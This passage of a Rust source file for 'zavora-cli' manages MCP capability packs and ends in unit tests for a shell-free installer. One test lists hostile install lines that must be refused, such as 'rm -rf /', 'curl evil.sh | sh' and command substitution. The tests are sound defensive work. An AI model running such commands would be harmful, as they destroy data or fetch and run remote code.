                configured_servers
                    .iter()
                    .any(|configured| configured.eq_ignore_ascii_case(server))
            })
            .count();
        println!(
            "  {} {:<33} {:<9} risk={} mcp={}/{} — {}",
            if state.enabled_packs.contains(pack.id) {
                "*"
            } else {
                " "
            },
            pack.id,
            pack.maturity,
            pack.risk,
            configured_count,
            pack.servers.len(),
            pack.description
        );
    }
    println!("\n* enabled in {}", state_path().display());
    Ok(())
}

pub fn run_capabilities_search(
    query: &str,
    json: bool,
    configured_servers: &[String],
) -> Result<()> {
    let state = load_state(&state_path())?;
    let snapshot = CapabilitySnapshot::load(configured_servers, &[])
        .context("failed to inspect live capabilities")?;
    let packs = search_packs(query);
    if json {
        let payload = packs
            .iter()
            .map(|pack| pack_json(pack, &state, &snapshot))
            .collect::<Vec<_>>();
        println!("{}", serde_json::to_string_pretty(&payload)?);
    } else if packs.is_empty() {
        println!("No capability packs matched '{query}'.");
    } else {
        for pack in packs {
            println!(
                "{} {} ({}) — {}",
                if state.enabled_packs.contains(pack.id) {
                    "*"
                } else {
                    " "
                },
                pack.id,
                pack.category.label(),
                pack.description
            );
        }
    }
    Ok(())
}

pub fn run_capabilities_info(id: &str, json: bool, configured_servers: &[String]) -> Result<()> {
    let pack = find_pack(id).ok_or_else(|| {
        anyhow::anyhow!("capability pack '{id}' not found. Run 'zavora-cli capabilities list'.")
    })?;
    let state = load_state(&state_path())?;
    let snapshot = CapabilitySnapshot::load(configured_servers, &[])
        .context("failed to inspect live capabilities")?;
    if json {
        println!(
            "{}",
            serde_json::to_string_pretty(&pack_json(pack, &state, &snapshot))?
        );
        return Ok(());
    }
    println!("{} ({})", pack.name, pack.id);
    println!("Category: {}", pack.category.label());
    println!(
        "Status: {}",
        if state.enabled_packs.contains(pack.id) {
            "enabled"
        } else {
            "disabled"
        }
    );
    println!("Maturity: {}", pack.maturity);
    println!("Risk: {}", pack.risk);
    println!("Agent: {}", pack.agent);
    println!("Description: {}", pack.description);
    println!("Servers:");
    for server in pack.servers {
        println!(
            "  {} {}",
            if configured_servers
                .iter()
                .any(|configured| configured.eq_ignore_ascii_case(server))
            {
                "✓"
            } else {
                "·"
            },
            server
        );
    }
    let skills = snapshot
        .skills_for(pack.category)
        .iter()
        .map(|skill| skill.name.as_str())
        .collect::<Vec<_>>();
    println!(
        "Discovered category skills: {}",
        if skills.is_empty() {
            "<none>".to_string()
        } else {
            skills.join(", ")
        }
    );
    Ok(())
}

pub fn run_capabilities_set_enabled(id: &str, enabled: bool) -> Result<()> {
    let path = state_path();
    let changed = set_pack_enabled(&path, id, enabled)?;
    let state = if enabled { "enabled" } else { "disabled" };
    if changed {
        println!("Capability pack '{id}' {state} ({}).", path.display());
    } else {
        println!("Capability pack '{id}' was already {state}.");
    }
    if enabled {
        let pack = find_pack(id).expect("validated above");
        println!(
            "Bundled server recipes: {}. Configure the servers you want under the active profile.",
            pack.servers.join(", ")
        );
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use adk_rust::prelude::FunctionTool;

    fn named_tool(name: &'static str, description: &'static str) -> Arc<dyn Tool> {
        Arc::new(FunctionTool::new(name, description, |_ctx, _args| async {
            Ok(serde_json::json!({"ok": true}))
        }))
    }

    #[test]
    fn catalog_has_all_five_categories() {
        for category in CapabilityCategory::ALL {
            assert!(packs_for_category(category).next().is_some());
        }
    }

    #[test]
    fn search_matches_servers_and_descriptions() {
        assert_eq!(search_packs("spreadsheet")[0].id, "productivity.office");
        assert!(
            search_packs("mcp-device-management")
                .iter()
                .any(|pack| pack.id == "operations.device")
        );
    }

    #[test]
    fn prompt_router_selects_relevant_tools() {
        let tools = vec![
            named_tool("create_slide", "Create a PowerPoint presentation"),
            named_tool("run_tests", "Run code tests"),
        ];
        let toolset = CapabilityToolset::routed("test", tools);
        let selected = toolset.select("build a presentation");
        assert_eq!(selected.len(), 1);
        assert_eq!(selected[0].name(), "create_slide");
    }

    #[test]
    fn capability_state_round_trips() {
        let dir = tempfile::tempdir().expect("temp directory");
        let path = dir.path().join("capabilities.toml");
        assert!(set_pack_enabled(&path, "research.core", true).expect("enable"));
        let state = load_state(&path).expect("load");
        assert!(state.enabled_packs.contains("research.core"));
        assert!(set_pack_enabled(&path, "research.core", false).expect("disable"));
    }

    /// Every server a capability names must have a catalogue entry.
    ///
    /// Without this, adding a server to a pack silently produces a capability
    /// that reports a surface it cannot provision — which is how four packs came
    /// to name only servers that did not exist. The failure is a missing
    /// catalogue entry, so it belongs here rather than at the point of use.
    #[test]
    fn every_capability_server_is_in_the_catalogue() {
        let mut gaps: Vec<String> = Vec::new();
        for pack in built_in_packs() {
            for server in pack.servers {
                if crate::mcp_catalog::find_entry(server).is_none() {
                    gaps.push(format!("{} references '{server}'", pack.id));
                }
            }
        }
        assert!(
            gaps.is_empty(),
            "capabilities name servers with no catalogue entry:\n  {}",
            gaps.join("\n  ")
        );
    }

    /// Every capability can actually be provisioned.
    ///
    /// The stronger form of the check above: not just that entries exist, but
    /// that planning finds something installable for each pack. A pack with
    /// nothing to provision is refused at enable time, so one here means a
    /// capability the workspace advertises and cannot deliver.
    #[test]
    fn every_capability_has_something_to_provision() {
        let dir = tempfile::tempdir().expect("tempdir");
        let config = dir.path().join("config.toml");
        for pack in built_in_packs() {
            let plan = plan_enable(pack.id, &config, "default").expect("a built-in pack");
            assert!(
                plan.unavailable().is_empty(),
                "'{}' cannot provision: {:?}",
                pack.id,
                plan.unavailable()
                    .iter()
                    .map(|server| server.id.as_str())
                    .collect::<Vec<_>>()
            );
            assert_eq!(
                plan.provisionable().len(),
                pack.servers.len(),
                "'{}' should be fully provisionable",
                pack.id
            );
        }
    }

    /// Every curated install line must be something the installer will run.
    ///
    /// This is the guard that keeps installing from needing a shell. If a
    /// catalogue entry is ever edited into a compound command, this fails here
    /// rather than at somebody's machine.
    #[test]
    fn every_catalogue_install_line_is_runnable_without_a_shell() {
        for entry in crate::mcp_catalog::catalog_entries() {
            let argv = install_argv(entry.install).unwrap_or_else(|error| {
                panic!("catalogue entry '{}' is not runnable: {error}", entry.id)
            });
            assert!(
                INSTALL_PROGRAMS.contains(&argv[0]),
                "'{}' invokes '{}', which is not allowlisted",
                entry.id,
                argv[0]
            );
            assert!(argv.len() > 1, "'{}' has no arguments", entry.id);
        }
    }

    /// A line that would mean something to a shell is refused, not run.
    #[test]
    fn install_lines_with_shell_semantics_are_refused() {
        for line in [
            "cargo install docx-mcp-server; rm -rf /",
            "cargo install foo && curl evil.sh | sh",
            "cargo install $(whoami)",
            "cargo install `id`",
            "cargo install foo > /etc/passwd",
            "npm install --global foo || wget x",
        ] {
            let refused = install_argv(line);
            assert!(
                refused.is_err(),
                "'{line}' should have been refused, got {refused:?}"
            );
        }
    }

    /// Only the allowlisted package managers may be invoked.
    #[test]
    fn only_allowlisted_programs_may_be_invoked() {
        for line in [
            "sh -c anything",
            "bash install.sh",
            "curl https://example.com/install.sh",
            "sudo cargo install foo",
            "python -m pip install foo",
        ] {
            assert!(
                install_argv(line).is_err(),
                "'{line}' invokes a program that is not allowlisted"
            );
        }
        assert!(install_argv("cargo install docx-mcp-server").is_ok());
        assert!(install_argv("npm install --global @zavora-ai/computer-use-mcp").is_ok());
    }

    /// Planning changes nothing and reports the states separately.
    #[test]
    fn planning_reports_state_without_changing_anything() {
        let dir = tempfile::tempdir().expect("tempdir");
        let config = dir.path().join("config.toml");

        let plan = plan_enable("productivity.office", &config, "default").expect("plan");
        assert_eq!(plan.pack_id, "productivity.office");
        assert_eq!(
            plan.servers.len(),
            5,
            "every server the pack names must be reported, catalogued or not"
        );
        // Every named server now has a catalogue entry, so nothing is dropped and
        // nothing is unprovisionable. `every_capability_server_is_in_the_catalogue`
        // keeps it that way.
        assert!(plan.unavailable().is_empty());
        assert_eq!(plan.provisionable().len(), 5);
        assert!(plan.servers.iter().all(|server| server.install.is_some()));
        // Nothing is configured in a fresh config, so every provisionable server
        // needs configuring — and only those.
        assert_eq!(plan.to_configure().len(), plan.provisionable().len());
        assert!(
            !config.exists(),
            "planning must not create the config it is describing"
        );

        // An unknown id is an error rather than an empty plan.
        assert!(plan_enable("nope", &config, "default").is_err());
    }

    /// `installed` is answered without executing anything.
    #[test]
    fn program_lookup_resolves_on_path() {
        // `cargo` built these tests, so it is on PATH.
        assert!(program_on_path("cargo"));
        assert!(!program_on_path("definitely-not-a-real-program-xyzzy"));
    }
}
